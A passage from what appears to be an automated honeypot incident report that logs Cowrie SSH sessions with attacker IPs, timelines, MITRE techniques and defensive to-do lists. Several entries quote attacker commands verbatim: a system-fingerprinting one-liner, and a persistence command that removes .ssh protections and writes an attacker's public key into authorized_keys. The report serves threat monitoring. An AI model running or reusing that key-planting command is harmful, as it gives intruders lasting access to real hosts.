| `2026-07-15 20:04:44` | `cowrie.session.connect` |
| `2026-07-15 20:04:47` | `cowrie.client.version` |
| `2026-07-15 20:04:47` | `cowrie.client.kex` |
| `2026-07-15 20:04:50` | `cowrie.login.success` |
| `2026-07-15 20:04:52` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.17.6[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.17.6[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b10bc7acac9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 20:07 |
| **Last Seen** | 2026-07-15 20:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:07:16` | `cowrie.session.connect` |
| `2026-07-15 20:07:16` | `cowrie.client.version` |
| `2026-07-15 20:07:16` | `cowrie.client.kex` |
| `2026-07-15 20:07:16` | `cowrie.login.success` |
| `2026-07-15 20:07:17` | `cowrie.session.params` |
| `2026-07-15 20:07:17` | `cowrie.command.input` |
| `2026-07-15 20:07:17` | `cowrie.command.input` |
| `2026-07-15 20:07:17` | `cowrie.command.input` |
| `2026-07-15 20:07:17` | `cowrie.command.input` |
| `2026-07-15 20:07:17` | `cowrie.command.input` |
| `2026-07-15 20:07:17` | `cowrie.command.success` |
| `2026-07-15 20:07:17` | `cowrie.command.input` |
| `2026-07-15 20:07:17` | `cowrie.command.input` |
| `2026-07-15 20:07:17` | `cowrie.command.input` |
| `2026-07-15 20:07:17` | `cowrie.command.input` |
| `2026-07-15 20:07:17` | `cowrie.log.closed` |
| `2026-07-15 20:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97ee4458f717

| Field | Detail |
|---|---|
| **Source IP** | `217.24.185[.]98` |
| **First Seen** | 2026-07-15 20:07 |
| **Last Seen** | 2026-07-15 20:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:07:24` | `cowrie.session.connect` |
| `2026-07-15 20:07:25` | `cowrie.client.version` |
| `2026-07-15 20:07:25` | `cowrie.client.kex` |
| `2026-07-15 20:07:26` | `cowrie.login.success` |
| `2026-07-15 20:07:26` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.24.185[.]98` to AbuseIPDB if not already reported
- [ ] Block `217.24.185[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2601f0d92a9

| Field | Detail |
|---|---|
| **Source IP** | `192.34.128[.]202` |
| **First Seen** | 2026-07-15 20:07 |
| **Last Seen** | 2026-07-15 20:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:07:31` | `cowrie.session.connect` |
| `2026-07-15 20:07:32` | `cowrie.client.version` |
| `2026-07-15 20:07:32` | `cowrie.client.kex` |
| `2026-07-15 20:07:33` | `cowrie.login.success` |
| `2026-07-15 20:07:34` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.34.128[.]202` to AbuseIPDB if not already reported
- [ ] Block `192.34.128[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-692268f15c56

| Field | Detail |
|---|---|
| **Source IP** | `207.56.229[.]202` |
| **First Seen** | 2026-07-15 20:08 |
| **Last Seen** | 2026-07-15 20:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:08:15` | `cowrie.session.connect` |
| `2026-07-15 20:08:15` | `cowrie.client.version` |
| `2026-07-15 20:08:15` | `cowrie.client.kex` |
| `2026-07-15 20:08:16` | `cowrie.login.success` |
| `2026-07-15 20:08:17` | `cowrie.session.params` |
| `2026-07-15 20:08:17` | `cowrie.command.input` |
| `2026-07-15 20:08:17` | `cowrie.command.failed` |
| `2026-07-15 20:08:17` | `cowrie.log.closed` |
| `2026-07-15 20:08:18` | `cowrie.session.params` |
| `2026-07-15 20:08:18` | `cowrie.command.input` |
| `2026-07-15 20:08:18` | `cowrie.session.file_download` |
| `2026-07-15 20:08:18` | `cowrie.log.closed` |
| `2026-07-15 20:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.56.229[.]202` to AbuseIPDB if not already reported
- [ ] Block `207.56.229[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eba60300d80

| Field | Detail |
|---|---|
| **Source IP** | `207.56.229[.]202` |
| **First Seen** | 2026-07-15 20:08 |
| **Last Seen** | 2026-07-15 20:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:08:18` | `cowrie.session.connect` |
| `2026-07-15 20:08:18` | `cowrie.client.version` |
| `2026-07-15 20:08:18` | `cowrie.client.kex` |
| `2026-07-15 20:08:19` | `cowrie.login.success` |
| `2026-07-15 20:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.56.229[.]202` to AbuseIPDB if not already reported
- [ ] Block `207.56.229[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e1f7f40ff47

| Field | Detail |
|---|---|
| **Source IP** | `207.56.229[.]202` |
| **First Seen** | 2026-07-15 20:08 |
| **Last Seen** | 2026-07-15 20:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:08:19` | `cowrie.session.connect` |
| `2026-07-15 20:08:19` | `cowrie.client.version` |
| `2026-07-15 20:08:19` | `cowrie.client.kex` |
| `2026-07-15 20:08:20` | `cowrie.login.success` |
| `2026-07-15 20:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.56.229[.]202` to AbuseIPDB if not already reported
- [ ] Block `207.56.229[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c27a933c74b7

| Field | Detail |
|---|---|
| **Source IP** | `46.29.26[.]195` |
| **First Seen** | 2026-07-15 20:08 |
| **Last Seen** | 2026-07-15 20:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:08:34` | `cowrie.session.connect` |
| `2026-07-15 20:08:34` | `cowrie.client.version` |
| `2026-07-15 20:08:34` | `cowrie.client.kex` |
| `2026-07-15 20:08:34` | `cowrie.login.success` |
| `2026-07-15 20:08:35` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:08:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-15 20:08:35` | `cowrie.direct-tcpip.data` |
| `2026-07-15 20:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.29.26[.]195` to AbuseIPDB if not already reported
- [ ] Block `46.29.26[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-460653a89d4b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 20:10 |
| **Last Seen** | 2026-07-15 20:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:10:24` | `cowrie.session.connect` |
| `2026-07-15 20:10:24` | `cowrie.client.version` |
| `2026-07-15 20:10:24` | `cowrie.client.kex` |
| `2026-07-15 20:10:25` | `cowrie.login.success` |
| `2026-07-15 20:10:25` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:10:25` | `cowrie.direct-tcpip.data` |
| `2026-07-15 20:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa794094270c

| Field | Detail |
|---|---|
| **Source IP** | `118.122.196[.]230` |
| **First Seen** | 2026-07-15 20:10 |
| **Last Seen** | 2026-07-15 20:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:10:47` | `cowrie.session.connect` |
| `2026-07-15 20:10:47` | `cowrie.client.version` |
| `2026-07-15 20:10:47` | `cowrie.client.kex` |
| `2026-07-15 20:10:49` | `cowrie.login.success` |
| `2026-07-15 20:10:50` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:10:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.196[.]230` to AbuseIPDB if not already reported
- [ ] Block `118.122.196[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c776d62554f

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-07-15 20:10 |
| **Last Seen** | 2026-07-15 20:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:10:56` | `cowrie.session.connect` |
| `2026-07-15 20:10:56` | `cowrie.client.version` |
| `2026-07-15 20:10:56` | `cowrie.client.kex` |
| `2026-07-15 20:10:59` | `cowrie.login.success` |
| `2026-07-15 20:10:59` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd3d82848065

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 20:12 |
| **Last Seen** | 2026-07-15 20:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:12:04` | `cowrie.session.connect` |
| `2026-07-15 20:12:05` | `cowrie.client.version` |
| `2026-07-15 20:12:05` | `cowrie.client.kex` |
| `2026-07-15 20:12:05` | `cowrie.login.success` |
| `2026-07-15 20:12:06` | `cowrie.session.params` |
| `2026-07-15 20:12:06` | `cowrie.command.input` |
| `2026-07-15 20:12:06` | `cowrie.command.input` |
| `2026-07-15 20:12:06` | `cowrie.command.input` |
| `2026-07-15 20:12:06` | `cowrie.command.input` |
| `2026-07-15 20:12:06` | `cowrie.command.input` |
| `2026-07-15 20:12:06` | `cowrie.command.success` |
| `2026-07-15 20:12:06` | `cowrie.command.input` |
| `2026-07-15 20:12:06` | `cowrie.command.input` |
| `2026-07-15 20:12:06` | `cowrie.command.input` |
| `2026-07-15 20:12:06` | `cowrie.command.input` |
| `2026-07-15 20:12:06` | `cowrie.log.closed` |
| `2026-07-15 20:12:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10e181dd5c0b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 20:14 |
| **Last Seen** | 2026-07-15 20:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:14:37` | `cowrie.session.connect` |
| `2026-07-15 20:14:37` | `cowrie.client.version` |
| `2026-07-15 20:14:38` | `cowrie.client.kex` |
| `2026-07-15 20:14:38` | `cowrie.login.success` |
| `2026-07-15 20:14:40` | `cowrie.session.params` |
| `2026-07-15 20:14:40` | `cowrie.command.input` |
| `2026-07-15 20:14:40` | `cowrie.command.input` |
| `2026-07-15 20:14:40` | `cowrie.command.input` |
| `2026-07-15 20:14:40` | `cowrie.command.input` |
| `2026-07-15 20:14:40` | `cowrie.command.input` |
| `2026-07-15 20:14:40` | `cowrie.command.success` |
| `2026-07-15 20:14:40` | `cowrie.command.input` |
| `2026-07-15 20:14:40` | `cowrie.command.input` |
| `2026-07-15 20:14:40` | `cowrie.command.input` |
| `2026-07-15 20:14:40` | `cowrie.command.input` |
| `2026-07-15 20:14:40` | `cowrie.log.closed` |
| `2026-07-15 20:14:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f6d7bb5b4ad

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 20:17 |
| **Last Seen** | 2026-07-15 20:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:17:04` | `cowrie.session.connect` |
| `2026-07-15 20:17:04` | `cowrie.client.version` |
| `2026-07-15 20:17:04` | `cowrie.client.kex` |
| `2026-07-15 20:17:04` | `cowrie.login.success` |
| `2026-07-15 20:17:05` | `cowrie.session.params` |
| `2026-07-15 20:17:05` | `cowrie.command.input` |
| `2026-07-15 20:17:05` | `cowrie.command.input` |
| `2026-07-15 20:17:05` | `cowrie.command.input` |
| `2026-07-15 20:17:05` | `cowrie.command.input` |
| `2026-07-15 20:17:05` | `cowrie.command.input` |
| `2026-07-15 20:17:05` | `cowrie.command.success` |
| `2026-07-15 20:17:05` | `cowrie.command.input` |
| `2026-07-15 20:17:05` | `cowrie.command.input` |
| `2026-07-15 20:17:05` | `cowrie.command.input` |
| `2026-07-15 20:17:05` | `cowrie.command.input` |
| `2026-07-15 20:17:06` | `cowrie.log.closed` |
| `2026-07-15 20:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-783b5c9475f7

| Field | Detail |
|---|---|
| **Source IP** | `36.104.144[.]114` |
| **First Seen** | 2026-07-15 20:17 |
| **Last Seen** | 2026-07-15 20:22 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:17:21` | `cowrie.session.connect` |
| `2026-07-15 20:17:21` | `cowrie.client.version` |
| `2026-07-15 20:17:22` | `cowrie.client.kex` |
| `2026-07-15 20:17:23` | `cowrie.login.success` |
| `2026-07-15 20:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.104.144[.]114` to AbuseIPDB if not already reported
- [ ] Block `36.104.144[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd202bf1a2f7

| Field | Detail |
|---|---|
| **Source IP** | `36.104.144[.]114` |
| **First Seen** | 2026-07-15 20:20 |
| **Last Seen** | 2026-07-15 20:25 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:20:33` | `cowrie.session.connect` |
| `2026-07-15 20:20:33` | `cowrie.client.version` |
| `2026-07-15 20:20:33` | `cowrie.client.kex` |
| `2026-07-15 20:20:34` | `cowrie.login.success` |
| `2026-07-15 20:25:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.104.144[.]114` to AbuseIPDB if not already reported
- [ ] Block `36.104.144[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67e5875e0f07

| Field | Detail |
|---|---|
| **Source IP** | `96.1.40[.]151` |
| **First Seen** | 2026-07-15 20:26 |
| **Last Seen** | 2026-07-15 20:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:26:20` | `cowrie.session.connect` |
| `2026-07-15 20:26:21` | `cowrie.client.version` |
| `2026-07-15 20:26:21` | `cowrie.client.kex` |
| `2026-07-15 20:26:22` | `cowrie.login.success` |
| `2026-07-15 20:26:22` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.1.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `96.1.40[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ded3dfc277df

| Field | Detail |
|---|---|
| **Source IP** | `125.35.109[.]214` |
| **First Seen** | 2026-07-15 20:26 |
| **Last Seen** | 2026-07-15 20:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:26:32` | `cowrie.session.connect` |
| `2026-07-15 20:26:33` | `cowrie.client.version` |
| `2026-07-15 20:26:33` | `cowrie.client.kex` |
| `2026-07-15 20:26:35` | `cowrie.login.success` |
| `2026-07-15 20:26:35` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:26:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.35.109[.]214` to AbuseIPDB if not already reported
- [ ] Block `125.35.109[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d04bf1532023

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-15 20:27 |
| **Last Seen** | 2026-07-15 20:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:27:31` | `cowrie.session.connect` |
| `2026-07-15 20:27:31` | `cowrie.client.version` |
| `2026-07-15 20:27:31` | `cowrie.client.kex` |
| `2026-07-15 20:27:32` | `cowrie.login.success` |
| `2026-07-15 20:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-688a0ca8192b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-15 20:27 |
| **Last Seen** | 2026-07-15 20:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:27:31` | `cowrie.session.connect` |
| `2026-07-15 20:27:31` | `cowrie.client.version` |
| `2026-07-15 20:27:31` | `cowrie.client.kex` |
| `2026-07-15 20:27:32` | `cowrie.login.success` |
| `2026-07-15 20:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe4123821289

| Field | Detail |
|---|---|
| **Source IP** | `36.104.144[.]114` |
| **First Seen** | 2026-07-15 20:30 |
| **Last Seen** | 2026-07-15 20:35 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:30:43` | `cowrie.session.connect` |
| `2026-07-15 20:30:43` | `cowrie.client.version` |
| `2026-07-15 20:30:43` | `cowrie.client.kex` |
| `2026-07-15 20:30:44` | `cowrie.login.success` |
| `2026-07-15 20:35:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.104.144[.]114` to AbuseIPDB if not already reported
- [ ] Block `36.104.144[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-269107bc5dce

| Field | Detail |
|---|---|
| **Source IP** | `14.29.208[.]128` |
| **First Seen** | 2026-07-15 20:32 |
| **Last Seen** | 2026-07-15 20:37 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:32:18` | `cowrie.session.connect` |
| `2026-07-15 20:32:19` | `cowrie.client.version` |
| `2026-07-15 20:32:19` | `cowrie.client.kex` |
| `2026-07-15 20:32:20` | `cowrie.login.success` |
| `2026-07-15 20:32:21` | `cowrie.session.params` |
| `2026-07-15 20:32:21` | `cowrie.command.input` |
